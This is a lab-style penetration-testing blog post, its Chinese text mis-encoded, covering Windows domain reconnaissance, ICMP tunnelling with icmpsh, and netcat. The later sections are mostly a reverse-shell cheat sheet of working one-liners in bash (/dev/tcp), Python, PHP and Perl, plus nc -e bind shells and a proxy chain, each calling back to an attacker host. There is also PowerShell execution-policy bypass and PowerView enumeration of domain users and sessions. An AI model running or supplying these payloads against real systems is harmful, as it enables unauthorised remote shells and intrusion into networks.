<h3 id="åŸŸå†…ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…ä¿¡æ¯æ”¶é›†</h3><h4 id="åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ"></a>åˆ¤æ–­æ˜¯å¦æœ‰åŸŸ</h4><p><code>ipconfig /all</code>æŸ¥çœ‹ä¿¡æ¯</p>
<p><code>net time /domain</code> åˆ¤æ–­æ˜¯å¦å­˜åœ¨  </p>
<blockquote>
<p>å­˜åœ¨   è¿”å›åŸŸä¿¡æ¯å’Œæ—¶é—´ </p>
<p>å­˜åœ¨ä½†æƒé™ä¸è¶³  å‘ç”Ÿç³»ç»Ÿé”™è¯¯ æ‹’ç»è®¿é—®</p>
<p>ä¸å­˜åœ¨ æ‰¾ä¸åˆ°åŸŸWorkgroupçš„åŸŸæ§åˆ¶å™¨</p>
</blockquote>
<br>

<h4 id="åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹"></a>åŸŸå†…å­˜æ´»ä¸»æœºæ¢æµ‹</h4><h5 id="åŸºäºICMP"><a href="#åŸºäºICMP" class="headerlink" title="åŸºäºICMP"></a>åŸºäºICMP</h5><ul>
<li>windows</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for &#x2F;l %i in (1,1,254) do @ping 192.168.56.%i -w 1 -n 1 | find &#x2F;i &quot;ttl&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">è§£é‡Š:</span><br><span class="line">%i in (1,1,254)    éå†ä¸»æœºä½ä»1 ~254çš„æ‰€æœ‰IP </span><br><span class="line">-n    pingçš„æ¬¡æ•°           </span><br><span class="line">-w    ç­‰å¾…æ¯æ¬¡å›å¤çš„æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰            </span><br><span class="line">192.168.0.%i    éå†IP è‡ª192.168.0.1~192.168.0.254çš„æ‰€æœ‰IP           </span><br><span class="line">| bat    ç®¡é“ï¼Œå°†å‰é¢çš„ç»“æœé€šè¿‡ç®¡é“è¾“å…¥ç»™åé¢çš„å‘½ä»¤  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/icmp_ping.png"></p>
<ul>
<li>Linux</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>nmapæ‰«æ</li>
</ul>
<p><code>nmap â€sP â€PI 192.168.0.1/24 â€T4</code></p>
<p><img src="/posts/11ff0b53/nmap_icmp.png"></p>
<br>

<h5 id="åŸºäºarp"><a href="#åŸºäºarp" class="headerlink" title="åŸºäºarp"></a>åŸºäºarp</h5><ul>
<li>arp-scan   ä¸‹è½½åœ°å€: <a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></li>
</ul>
<p>ç”¨æ³• <code>arp-scan.exe -t 192.168.56.0/24</code></p>
<p><img src="/posts/11ff0b53/arp-scan.png"></p>
<ul>
<li>arp</li>
</ul>
<p><code>arp -a</code></p>
<ul>
<li>nmapæ‰«æ</li>
</ul>
<p><code>nmap -sn -PR 192.168.0.1/24</code></p>
<p><img src="/posts/11ff0b53/nmap_arp.png"></p>
<ul>
<li>msfæ‰«æ</li>
</ul>
<p><code>use auxiliary/scanner/discovery/arp_sweep</code></p>
<br>

<h5 id="åŸºäºudp"><a href="#åŸºäºudp" class="headerlink" title="åŸºäºudp"></a>åŸºäºudp</h5><ul>
<li>scanline</li>
</ul>
<p><code>scanline.exe 192.168.56.101</code></p>
<p><img src="/posts/11ff0b53/scanline.png"></p>
<br>

<h5 id="åŸºäºNetBIOS"><a href="#åŸºäºNetBIOS" class="headerlink" title="åŸºäºNetBIOS"></a>åŸºäºNetBIOS</h5><ul>
<li>nbtscan</li>
</ul>
<p><code>nbtscan -r 192.168.0.0/24</code></p>
<p><img src="/posts/11ff0b53/nbtscan.png"></p>
<ul>
<li>msfæ‰«æ</li>
</ul>
<p><code>use auxiliary/scanner/netbios/nbname</code><br><img src="/posts/11ff0b53/msf_netbios.png"></p>
<ul>
<li>nmapæ‰«æ</li>
</ul>
<p><code>nmap -sU --script nbstat.nse -p137 192.168.0.1/24 -T4</code></p>
<p><img src="/posts/11ff0b53/nmap_netbios.png"></p>
<br>

<h4 id="æ‰«æåŸŸå†…ç«¯å£"><a href="#æ‰«æåŸŸå†…ç«¯å£" class="headerlink" title="æ‰«æåŸŸå†…ç«¯å£"></a>æ‰«æåŸŸå†…ç«¯å£</h4><h5 id="åˆ©ç”¨telnet-å‘½ä»¤è¿›è¡Œæ‰«æ"><a href="#åˆ©ç”¨telnet-å‘½ä»¤è¿›è¡Œæ‰«æ" class="headerlink" title="åˆ©ç”¨telnet å‘½ä»¤è¿›è¡Œæ‰«æ"></a>åˆ©ç”¨telnet å‘½ä»¤è¿›è¡Œæ‰«æ</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet ç›®æ ‡ipåœ°å€ ç«¯å£å·</span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£"><a href="#åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£" class="headerlink" title="åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£"></a>åˆ©ç”¨msfæ‰«æä¸»æœºç«¯å£</h5><p><code>use auxiliary/scanner/portscan/tcp</code></p>
<p><code>show options </code></p>
<p><code>set ports 1-1024 </code></p>
<p><code>set RHOSTS 192.168.56.101</code></p>
<p><code>set THREADS 10 </code></p>
<p><code>run</code></p>
<p><img src="/posts/11ff0b53/msf_portscan_tcp.png"></p>
<h4 id="åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†"><a href="#åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†"></a>åŸŸå†…åŸºç¡€ä¿¡æ¯æ”¶é›†</h4><p><code>net view /domain</code> æŸ¥çœ‹åŸŸ</p>
<p><code>net view /domain:åŸŸå</code> æŸ¥çœ‹åŸŸçš„ç”µè„‘</p>
<p><code>net group /domain</code> æŸ¥çœ‹åŸŸå†…ç”¨æˆ·ç»„çš„åˆ—è¡¨</p>
<p><code>net group &quot;domain computers&quot; /domain </code>  æŸ¥è¯¢åŸŸæˆå‘˜çš„åˆ—è¡¨</p>
<p><code>net account /domain</code></p>
<h4 id="æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜"><a href="#æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜" class="headerlink" title="æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜"></a>æŸ¥æ‰¾åŸŸå†…ç”¨æˆ·å’Œç®¡ç†å‘˜</h4><p><code>net user /domain</code></p>
<h4 id="å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·"><a href="#å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·" class="headerlink" title="å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·"></a>å†…ç½‘å®šä½ç®¡ç†å‘˜å·¥å…·</h4><p>å‚è€ƒ <a href="https://www.secpulse.com/archives/32859.html">https://www.secpulse.com/archives/32859.html</a></p>
<p><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p>
<ul>
<li><p>Empire  user_hunteræ¨¡å—</p>
</li>
<li><p>psloggedon.exe</p>
</li>
</ul>
<p><code>PsLoggedon.exe</code></p>
<ul>
<li>PVEFindADUser.exe</li>
</ul>
<p><code>PVEFindADUser.exe --current</code> æšä¸¾å‡ºåŸŸç”¨æˆ·ä»¥åŠç™»é™†è¿‡ç‰¹å®šç³»ç»Ÿçš„ç”¨æˆ·(éœ€è¦ç®¡ç†å‘˜æƒé™)</p>
<ul>
<li>Netsess.exe </li>
</ul>
<p>æŸ¥è¯¢æ‰€æœ‰åŸŸæ§åˆ¶å™¨ï¼Œè·å–æ‰€æœ‰çš„æ´»è·ƒåŸŸ </p>
<p>ä¸‹è½½åœ°å€:<a href="http://www.joeware.net/freetools/tools/netsess/index.htm">http://www.joeware.net/freetools/tools/netsess/index.htm</a></p>
<p>ç”¨æ³• <code>Netsess.exe -h</code></p>
<br>

<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>ç‰ˆæœ¬</p>
<blockquote>
<p>2.0     win2008,win7</p>
<p>3.0    win2018,win8</p>
<p>4.0    win2012R2,win8.1</p>
<p>5.0    win2016,win10</p>
</blockquote>
<p>å­˜åœ¨4ä¸­æƒé™</p>
<blockquote>
<p>Restricted     ä¸å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬</p>
<p>Allsigned        åªå…è®¸æ‰§è¡Œç»è¿‡è¯ä¹¦éªŒè¯çš„è„šæœ¬</p>
<p>Unrestricted    å…è®¸æ‰§è¡Œä»»ä½•è„šæœ¬</p>
<p>RemoteSigned    æœ¬åœ°è„šæœ¬ä¸é™åˆ¶ï¼Œå¯¹å¤–éƒ¨è„šæœ¬éœ€è¦ç»è¿‡è¯ä¹¦éªŒè¯</p>
</blockquote>
<p><code>Get-ExecutionPolicy</code>     æŸ¥çœ‹PSæƒé™</p>
<p><code>Set-ExecutionPolicy +æƒé™</code></p>
<p>ä¸€èˆ¬ä¼šç”¨cmd å‘½ä»¤è¡Œ  ä½¿ç”¨<code>-exec bypass</code>è¿›è¡Œpowershellç»•è¿‡</p>
<h5 id="PowerViewè„šæœ¬"><a href="#PowerViewè„šæœ¬" class="headerlink" title="PowerViewè„šæœ¬"></a>PowerViewè„šæœ¬</h5><p>è„šæœ¬åœ°å€ï¼š<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p><code>Import-Module</code>ä¸ºpowershellå¯¼å…¥è„šæœ¬å‘½ä»¤ï¼Œè¿™é‡Œå‡è®¾æˆ‘ä»¬ä¸‹è½½çš„powerview.ps1è„šæœ¬åœ¨C:\PowerView.ps1</p>
<p>æ ¼å¼ï¼š</p>
<p><code>powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerviewçš„å‘½ä»¤å‚æ•°&#125;&quot;</code></p>
<p>powershell.exe -exec bypass -Command â€œ&amp; {Import-Module C:\PowerView.ps1; Get-NetUser}â€</p>
<p>PowerViewå‘½ä»¤å‚æ•°</p>
<blockquote>
<p>Get-NetDomain: è·å–å½“å‰ç”¨æˆ·æ‰€åœ¨åŸŸçš„åç§°<br>Get-NetUser: è·å–æ‰€æœ‰ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯<br>Get-NetDomainController: è·å–æ‰€æœ‰åŸŸæ§åˆ¶å™¨çš„ä¿¡æ¯<br>Get-NetComputer: è·å–åŸŸå†…æ‰€æœ‰æœºå™¨çš„è¯¦ç»†ä¿¡æ¯<br>Get-NetOU: è·å–åŸŸä¸­çš„OUä¿¡æ¯<br>Get-NetGroup: è·å–æ‰€æœ‰åŸŸå†…ç»„å’Œç»„æˆå‘˜ä¿¡æ¯<br>Get-NetFileServer: æ ¹æ®SPNè·å–å½“å‰åŸŸä½¿ç”¨çš„æ–‡ä»¶æœåŠ¡å™¨ä¿¡æ¯<br>Get-NetShare: è·å–å½“å‰åŸŸå†…æ‰€æœ‰ç½‘ç»œå…±äº«ä¿¡æ¯<br>Get-NetSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„ä¼šè¯<br>Get-NetRDPSession: è·å–æŒ‡å®šæœåŠ¡å™¨çš„è¿œç¨‹è¿æ¥<br>Get-NetProcess: è·å–è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹<br>Get-UserEvent: è·å–æŒ‡å®šç”¨æˆ·çš„æ—¥å¿—<br>Get-ADObiect: è·å–æ´»åŠ¨ç›®å½•çš„å¯¹è±¡<br>Get-NetGPO: è·å–åŸŸå†…æ‰€æœ‰çš„ç»„ç­–ç•¥å¯¹è±¡<br>Get-DomainPolicy: è·å–åŸŸé»˜è®¤ç­–ç•¥æˆ–åŸŸæ§åˆ¶å™¨ç­–ç•¥<br>Invoke-UserHunter: è·å–åŸŸç”¨æˆ·ç™»å½•çš„è®¡ç®—æœºä¿¡æ¯åŠè¯¥ç”¨æˆ·æ˜¯å¦æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™<br>Invoke-ProcessHunter: é€šè¿‡æŸ¥è¯¢åŸŸå†…æ‰€æœ‰çš„æœºå™¨è¿›ç¨‹æ‰¾åˆ°ç‰¹å®šç”¨æˆ·<br>Invoke-UserEvenHunter: æ ¹æ®ç”¨æˆ·æ—¥å¿—æŸ¥è¯¢æŸåŸŸç”¨æˆ·ç™»å½•è¿‡å“ªäº›åŸŸæœºå™¨ã€‚</p>
</blockquote>
<br>

<h4 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>BloodHoundéœ€è¦ä½¿ç”¨neo4jæ•°æ®åº“ï¼Œé…å¤‡javaç¯å¢ƒ</p>
<p>ä¸‹è½½åœ°å€ <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
<blockquote>
<p>URLï¼šneo4j://localhost:7687<br>ç”¨æˆ·å(é»˜è®¤)ï¼šneo4j<br>å¯†ç (é»˜è®¤)ï¼šneo4j</p>
</blockquote>
<p>ä½¿ç”¨ã€å¾…è¡¥å…… ã€‘Â·</p>
<hr>
<h3 id="éšè—é€šä¿¡éš§é“æŠ€æœ¯"><a href="#éšè—é€šä¿¡éš§é“æŠ€æœ¯" class="headerlink" title="éšè—é€šä¿¡éš§é“æŠ€æœ¯"></a>éšè—é€šä¿¡éš§é“æŠ€æœ¯</h3><p>éš§é“: ç»•è¿‡é˜²ç«å¢™å±è”½çš„ä¸€ç§æ–¹å¼</p>
<br>

<p>ç½‘ç»œå±‚éš§é“ï¼š</p>
<ul>
<li>IPv6</li>
<li>ICMP</li>
</ul>
<p>ä¼ è¾“å±‚</p>
<ul>
<li>TCP</li>
<li>UDP</li>
</ul>
<p>åº”ç”¨å±‚</p>
<ul>
<li>SSH</li>
<li>HTTP</li>
<li>DNS</li>
</ul>
<br>

<h4 id="å†…ç½‘è¿é€šæ€§åˆ¤æ–­"><a href="#å†…ç½‘è¿é€šæ€§åˆ¤æ–­" class="headerlink" title="å†…ç½‘è¿é€šæ€§åˆ¤æ–­"></a>å†…ç½‘è¿é€šæ€§åˆ¤æ–­</h4><ul>
<li><p>ICMPåè®®</p>
<p>  ping ip</p>
</li>
<li><p>TCPåè®®</p>
<p>  nc  -zc ip port</p>
</li>
<li><p>HTTPåè®®</p>
<p>  curl ip:port</p>
</li>
<li><p>DNSåè®®</p>
<p>  nslookup  <a href="http://www.baidu.com/">www.baidu.com</a> </p>
<p>  dig @8.8.8.8 <a href="http://www.baidu.com/">www.baidu.com</a></p>
</li>
</ul>
<br>

<br>

<h4 id="ç½‘ç»œå±‚éš§é“"><a href="#ç½‘ç»œå±‚éš§é“" class="headerlink" title="ç½‘ç»œå±‚éš§é“"></a>ç½‘ç»œå±‚éš§é“</h4><ul>
<li>Ipv6éš§é“</li>
<li>ICMPéš§é“</li>
</ul>
<br>

<h5 id="ICMPéš§é“"><a href="#ICMPéš§é“" class="headerlink" title="ICMPéš§é“"></a>ICMPéš§é“</h5><p>ICMPéš§é“å·¥å…·ï¼šicmpshï¼ŒPingtunnel</p>
<p>icmpsh (ä»…é€‚ç”¨äºwindowsï¼Œæ‰§è¡Œicmpsh.exeä¸éœ€è¦ç®¡ç†å‘˜æƒé™)</p>
<p>Pingtunnel</p>
<br>

<h5 id="icmpshåå¼¹shell"><a href="#icmpshåå¼¹shell" class="headerlink" title="icmpshåå¼¹shell"></a>icmpshåå¼¹shell</h5><p>å‚è€ƒ:<a href="https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ">https://www.gdcert.com.cn/index/news_detail/WFJRQF0uABYBFgYEBwQ</a></p>
<p>å®‰è£… <code>git clone https://github.com/inquisb/icmpsh.git</code></p>
<p>å®‰è£…ä¾èµ–åº“<code>sudo  pip2 install impacket</code></p>
<blockquote>
<p>ç¯å¢ƒ</p>
<p>kali 192.168.0.128<br>win7 192.168.0.129</p>
</blockquote>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</code> å…³é—­æœ¬åœ°ç³»ç»Ÿçš„icmpåº”ç­”ï¼Œæ¢å¤æ”¹ä¸º0å³å¯</p>
<p>å°† icmpsh.exeä¼ åˆ°win7ä¸­ï¼Œè¿™é‡Œå¼€å¯ä¸ªhttpæœåŠ¡å»ä¸‹è½½<code>python3 -m http.server 9999</code></p>
<p>win7è®¿é—®192.168.0.128:9999 å»ä¸‹è½½ icmpsh.exe</p>
<p>icmpsh.exeå‚æ•°</p>
<blockquote>
<p>-t host         :æŒ‡å®šæ”»å‡»è€…IP<br>-r              :ç”¨äºæµ‹è¯•è¿æ¥<br>-d milliseconds :è®¾ç½®è¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿ(æ¯«ç§’)<br>-o milliseconds :è®¾ç½®å“åº”è¶…æ—¶æ—¶é—´(æ¯«ç§’),è¶…æ—¶ä¸€æ¬¡åˆ™è®¡æ•°å™¨+1<br>-b num          :è®¾ç½®å¤šå°‘æ¬¡é€€å‡º<br>-s bytes        :æœ€å¤§æ•°æ®ç¼“å†²åŒºå¤§å°(å­—èŠ‚)</p>
</blockquote>
<p>kali:<code>sudo python2 icmpsh_m.py  192.168.0.128[kali] 192.168.0.129[win7]</code></p>
<p>win7 <code>icmpsh.exe -t 192.168.0.128</code></p>
<p>æˆåŠŸåå¼¹shell</p>
<p><img src="/posts/11ff0b53/icmpsh_shell.png"></p>
<p><code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0</code>æ¢å¤åŸè®¾ç½®</p>
<br>

<h5 id="PingTunnelä½¿ç”¨"><a href="#PingTunnelä½¿ç”¨" class="headerlink" title="PingTunnelä½¿ç”¨"></a>PingTunnelä½¿ç”¨</h5><p>ã€å¾…è¡¥å……ã€‘</p>
<hr>
<h4 id="ä¼ è¾“å±‚éš§é“"><a href="#ä¼ è¾“å±‚éš§é“" class="headerlink" title="ä¼ è¾“å±‚éš§é“"></a>ä¼ è¾“å±‚éš§é“</h4><h5 id="lcxç«¯å£è½¬å‘"><a href="#lcxç«¯å£è½¬å‘" class="headerlink" title="lcxç«¯å£è½¬å‘"></a>lcxç«¯å£è½¬å‘</h5><p>ã€å¾…è¡¥å……ã€‘</p>
<h5 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h5><p>ä¸‹è½½åœ°å€ï¼ˆè§£å‹å¯†ç ä¸ºncï¼‰:</p>
<p><a href="https://joncraton.org/files/nc111nt.zip">https://joncraton.org/files/nc111nt.zip</a></p>
<p><a href="https://joncraton.org/files/nc111nt_safe.zip">https://joncraton.org/files/nc111nt_safe.zip</a></p>
<br>

<h6 id="è·å–bannerä¿¡æ¯"><a href="#è·å–bannerä¿¡æ¯" class="headerlink" title="è·å–bannerä¿¡æ¯"></a>è·å–bannerä¿¡æ¯</h6><p><code>nc -nv 192.168.0.130 22</code></p>
<p><img src="/posts/11ff0b53/nc_nv.png"></p>
<h6 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h6><p><code>nc -zv 192.168.56.101 1080</code></p>
<p><img src="/posts/11ff0b53/nc_portscan.png">              </p>
<h6 id="è¿œç¨‹è¿æ¥ä¸»æœº"><a href="#è¿œç¨‹è¿æ¥ä¸»æœº" class="headerlink" title="è¿œç¨‹è¿æ¥ä¸»æœº"></a>è¿œç¨‹è¿æ¥ä¸»æœº</h6><p><code>nc -nvv 192.168.0.129 80</code>                                                     </p>
<h6 id="ç›‘å¬ç«¯å£"><a href="#ç›‘å¬ç«¯å£" class="headerlink" title="ç›‘å¬ç«¯å£"></a>ç›‘å¬ç«¯å£</h6><p><code>nc -lp 9999</code> ç›‘å¬æœ¬åœ°9999ç«¯å£ï¼Œè®¿é—®è¯¥ç«¯å£æ˜¯ä¼šè¾“å‡ºä¿¡æ¯</p>
<h6 id="æ–‡ä»¶ä¼ è¾“"><a href="#æ–‡ä»¶ä¼ è¾“" class="headerlink" title="æ–‡ä»¶ä¼ è¾“"></a>æ–‡ä»¶ä¼ è¾“</h6><p>Ubuntu: <code>nc -lp 6666 &gt; test.txt</code> å¼€å¯ç›‘å¬</p>
<p>kaliï¼š<code>echo &#39;test&#39; &gt; test.txt</code></p>
<p><code>nc -vn 192.168.0.130 6666 &lt; test.txt -q 1</code></p>
<p><img src="/posts/11ff0b53/nc_file.png"></p>
<h6 id="ç®€æ˜“èŠå¤©"><a href="#ç®€æ˜“èŠå¤©" class="headerlink" title="ç®€æ˜“èŠå¤©"></a>ç®€æ˜“èŠå¤©</h6><p>Ubuntu: <code>nc -l -p 8888</code></p>
<p>kaliï¼š<code>nc -vn 192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_talk.png"></p>
<h5 id="ncè·å–shell"><a href="#ncè·å–shell" class="headerlink" title="ncè·å–shell"></a>ncè·å–shell</h5><p>å‚è€ƒ <a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://www.jianshu.com/p/91dd4ab317c7">https://www.jianshu.com/p/91dd4ab317c7</a></p>
<br>

<blockquote>
<p>æ­£å‘shell   ç›®æ ‡æœºè¿›è¡Œç›‘å¬<br>åå‘shell   æ”»å‡»æœºè¿›è¡Œç›‘å¬</p>
</blockquote>
<h6 id="æ­£å‘shell"><a href="#æ­£å‘shell" class="headerlink" title="æ­£å‘shell"></a>æ­£å‘shell</h6><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è·å–æœåŠ¡ç«¯çš„shell ï¼ˆkaliã€æ”»å‡»æœºã€‘è¿æ¥ï¼Œç›®æ ‡æœºç›‘å¬ï¼‰</p>
<p>ç›®æ ‡æœºï¼š <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>æ”»å‡»æœºï¼š<code>nc 192.168.0.128 8888</code></p>
<br>

<p><img src="/posts/11ff0b53/nc_ubuntu_error.png"></p>
<p>è¿™é‡Œæˆ‘ä½¿ç”¨Ubuntuä½œä¸ºç›®æ ‡æœºå™¨æ˜¯ ä½¿ç”¨-e å‚æ•°ä¼šæŠ¥é”™ï¼Œä½¿ç”¨ç‰ˆæœ¬ä¸åŒï¼Œè¿™é‡Œubuntué»˜è®¤ç‰ˆæœ¬çš„ncä¸ºnetcat-openbsd ï¼Œæ²¡æœ‰-eå‚æ•° è€Œnetcat-traditionalç‰ˆæœ¬[v1.10-41.1] çš„å­˜åœ¨-eé€‰é¡¹ï¼Œkaliä¹Ÿæ˜¯é»˜è®¤è¯¥ç‰ˆæœ¬çš„nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ç»™Ubuntuæ›¿æ¢ä¸€ä¸ªncç‰ˆæœ¬ å‚è€ƒhttps:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;91dd4ab317c7</span><br><span class="line">sudo apt-get -y install netcat-traditional </span><br><span class="line"></span><br><span class="line">sudo update-alternatives --config nc </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/11ff0b53/ubuntu_nc_tra.png"></p>
<p>æˆåŠŸåˆ‡æ¢ubuntuçš„ncç‰ˆæœ¬</p>
<br>

<p>ä¾æ—§ä½¿ç”¨kaliä½œä¸ºæ”»å‡»æœºï¼Œubuntuä½œä¸ºç›®æ ‡æœº</p>
<p>ubuntu: <code>nc -lvp 8888 -e /bin/sh</code></p>
<p>kali: <code>nc  192.168.0.130 8888</code></p>
<p><img src="/posts/11ff0b53/nc_shell1.png"></p>
<h6 id="åå‘shell"><a href="#åå‘shell" class="headerlink" title="åå‘shell"></a>åå‘shell</h6><p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è·å–å®¢æˆ·ç«¯çš„shellï¼ˆkaliã€æ”»å‡»æœºã€‘ç›‘å¬ï¼Œç›®æ ‡æœºè¿æ¥ï¼‰</p>
<p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœº ï¼š<code>nc 192.168.0.130 8888 -e /bin/sh</code></p>
<p>å¦‚æœæ˜¯windows <code>nc -lvp lport -e c:\windows\system32\cmd.exe </code></p>
<p><img src="/posts/11ff0b53/nc_shell2.png"></p>
<h6 id="pythonåå‘shell"><a href="#pythonåå‘shell" class="headerlink" title="pythonåå‘shell"></a>pythonåå‘shell</h6><p>æ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨çš„python2è¿›è¡Œåå¼¹shell</p>
<p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœºï¼š<code>python2 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.128&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
<p><img src="/posts/11ff0b53/nc_shell3.png"></p>
<h6 id="bashåå‘shell"><a href="#bashåå‘shell" class="headerlink" title="bashåå‘shell"></a>bashåå‘shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888 </code></p>
<p>ç›®æ ‡æœºï¼š<code>bash -i &gt;&amp; /dev/tcp/192.168.0.128/8888 0&gt;&amp;1</code></p>
<p><img src="/posts/11ff0b53/nc_shell4.png"></p>
<h6 id="phpåå‘shell"><a href="#phpåå‘shell" class="headerlink" title="phpåå‘shell"></a>phpåå‘shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœºï¼š<code>php -r &#39;$sock=fsockopen(&quot;192.168.0.128&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
<p>ç”±äºubuntuæ²¡è£…phpç¯å¢ƒå°±ä¸æˆªå›¾æ¼”ç¤ºäº†</p>
<h6 id="perlåå‘shell"><a href="#perlåå‘shell" class="headerlink" title="perlåå‘shell"></a>perlåå‘shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœºï¼š<code>perl -e &#39;use Socket;$i=&quot;192.168.0.128&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p>
<h6 id="å†…ç½‘ä»£ç†å¼¹shell"><a href="#å†…ç½‘ä»£ç†å¼¹shell" class="headerlink" title="å†…ç½‘ä»£ç†å¼¹shell"></a>å†…ç½‘ä»£ç†å¼¹shell</h6><p><img src="/posts/11ff0b53/neiwangdaili_shell.jpg"></p>
<p>kaliæ‰§è¡Œ:<code>nc -lvp 3333</code><br>æ•°æ®åº“æ‰§è¡Œ:<code>nc -lvp 3333 -e /bin/sh</code><br>webæœåŠ¡å™¨æ‰§è¡Œï¼š<code>nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;</code></p>
<p>åŸç†ï¼šwebæœåŠ¡å™¨å½“ä½œä¸­é—´æœºï¼Œè¿æ¥kaliå’Œæ•°æ®åº“çš„3333ç«¯å£ï¼Œä½¿kaliä¸æ•°æ®åº“é€šä¿¡</p>
<h6 id="execåå¼¹shell"><a href="#execåå¼¹shell" class="headerlink" title="execåå¼¹shell"></a>execåå¼¹shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœºï¼š<code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.0.128/8888; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p>
<p><img src="/posts/11ff0b53/nc_shell5.png"></p>
<p>å¯ä»¥åˆ©ç”¨python2 å˜ä¸ºäº¤äº’å¼çš„shell <code>python2 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<p>æˆ–<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<hr>
